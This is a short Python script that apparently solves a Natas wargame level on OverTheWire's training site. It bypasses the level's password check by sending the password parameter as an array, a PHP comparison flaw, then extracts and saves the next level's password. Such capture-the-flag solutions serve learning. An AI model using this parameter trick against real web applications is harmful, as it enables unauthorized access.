import re,requests,base64, natas

B64 = 'Basic %s' % base64.b64encode( '%s:%s' % ('natas24',natas.get_credential('natas24')))
URL = 'http://natas24.natas.labs.overthewire.org/?passwd[]=abcdef'

def main():
    response = requests.get(
            URL,
            headers=dict(Authorization=B64)
    )
    
    regex = r"Password: (\w+)"
    matches = re.finditer(regex,response.content, re.MULTILINE)

    for match in matches:
        print ('found password: %s' % match.group(1))
        print ('adding to credentials....')
        natas.save_credentials('natas25', match.group(1))
        print ('done')
        break

if __name__ == '__main__':
    main()

